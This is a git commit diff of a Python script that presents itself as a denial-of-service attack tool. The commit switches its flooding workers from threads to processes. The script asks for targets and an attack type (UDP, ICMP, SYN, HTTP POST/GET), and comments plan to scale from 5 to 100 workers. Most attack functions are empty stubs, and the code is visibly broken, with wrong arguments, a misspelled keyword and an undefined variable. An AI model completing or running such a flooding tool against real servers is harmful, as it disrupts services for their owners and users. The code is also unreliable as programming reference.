f8aea1e7ab94ae000dd5563f3d48bf75c0a0bebd
Riccardo <134144784+riccio8@users.noreply.github.com>
2024-08-03 16:47:53 +0200

    Update main.py
    same as the main file but sugin multiprocessing instead of multithreading

--- main.py
+++ main.py
@@ -1,11 +1,11 @@
 import requests as res
-import threading as th
+import multiprocessing
 import time
 import sys
 import os
 
 choices = [1, 2, 3]
-Threads = []
+processes = []
 try:
     attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
     vector = input("target(targets):\n").split(" ") #target
@@ -16,69 +16,69 @@ try:
         subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
         
         if subtype0 == 1:
-            def udp_flooding(self):
+            def udp_flooding():
                 print("first choice")
             
         else:
-            def ICMP(self):
+            def ICMP():
                 pass
                 
         if subtype0 == 1:
             for i in range(5): #not 5 but 100 
-                t = th.Thread(target=udp_flooding, args=(i,)) #problemm with the target, because is in a class
-                Threads.append(t)
-                t.start()
+                p = multiprocessing.Process(target=udp_flooding, args=(i,)) #problemm with the target, because is in a class
+                processes.append(p)
+                p.start()
 
             # Wait for all processes to complete
-            for t in Threads:
-                t.join()
+            for p in processes:
+                p.join()
                 
         if subtype0 == 2:
                 for i in range(5): #not 5 but 100 
-                    t = th.Thread(target=ICMPg, args=(i,)) #problemm with the target, because is in a class
-                    Threads.append(t)
-                    t.start()
+                    p = multiprocessing.Process(target=ICMP, args=(i,)) #problemm with the target, ptobably because is in a class
+                    processes.append(p)
+                    p.start()
 
                 # Wait for all processes to complete
-                for t in Threads:
-                    t.join()     
+                for p in processes:
+                    p.join()     
                     
     if attack_type == choices[1] and attack_type != choices[0] and attack_type != choices[2]:
         subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
         
         if subtype1 == 1:
-            def Syn_flood(self):
+            def Syn_flood():
                 pass
                 
         else:
-            def pof(self):
+            def pof():
                 pass
         if subtype1 == 1:
             for i in range(5): #not 5 but 100 
-                t = th.Thread(target=Syn_flood, args=(i,)) #problemm with the target, because is in a class
-                Threads.append(t)
-                t.start()
+                p = multiprocessing.Process(target=Syn_flood, args=(i,)) #problemm with the target, because is in a class
+                processes.append(p)
+                p.start()
 
             # Wait for all processes to complete
-            for t in Threads:
-                t.join()
+            for p in processes:
+                p.join()
                 
         if subtype1 == 2:
             for i in range(5): #not 5 but 100 
-                t = th.Thread(target=pof, args=(i,)) #problemm with the target, because is in a class
-                Threads.append(t)
-                t.start()
+                p = multiprocessing.Process(target=pof, args=(i,)) #problemm with the target, ptobably because is in a class
+                processes.append(p)
+                p.start()
 
-            # Wait for all processes to complete
-            for t in Threads:
-                t.join()
+                # Wait for all processes to complete
+            for p in processes:
+                p.join()
                   
                     
     if attack_type == choices[2] and attack_type != choices[0] and attack_type != choices[1]:
         subtype2 = int(input("Post(1) or Get(2)\n"))
 
         if subtype2 == 1:
-            def Post(self):
+            def Post():
                 print("using post method to: ", vector)
                 print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
                 time.sleep(10)
@@ -87,30 +87,30 @@ try:
                         response = res.post(vector, data=bye, jason=None)
                         print(response.text)
         else:       
-            def Get(self):
+            def Get():
                 pass
                 
                 
         if subtype2 == 1:
             for i in range(5): #not 5 but 100 
-                t = th.Thread(target=Post, args=(i,)) #problemm with the target, because is in a class
-                Threads.append(t)
-                t.start()
+                p = multiprocessing.Process(target=Post, args=(i,)) #problemm with the target, because is in a class
+                processes.append(p)
+                p.start()
 
             # Wait for all processes to complete
-            for t in Threads:
-                t.join()
+            for p in processes:
+                p.join()
                 
         if subtype2 == 2:
             for i in range(5): #not 5 but 100 
-                t = th.Thread(target=Get, args=(i,)) #problemm with the target, because is in a class
-                Threads.append(t)
-                t.start()
+                p = multiprocessing.Process(target=Get, args=(i,)) #problemm with the target, ptobably because is in a class
+                processes.append(p)
+                p.start()
 
-            # Wait for all processes to complete
-            for t in Threads:
-                t.join()
-
+                # Wait for all processes to complete
+            for p in processes:
+                p.join()
+ 
     else:
         pass
 
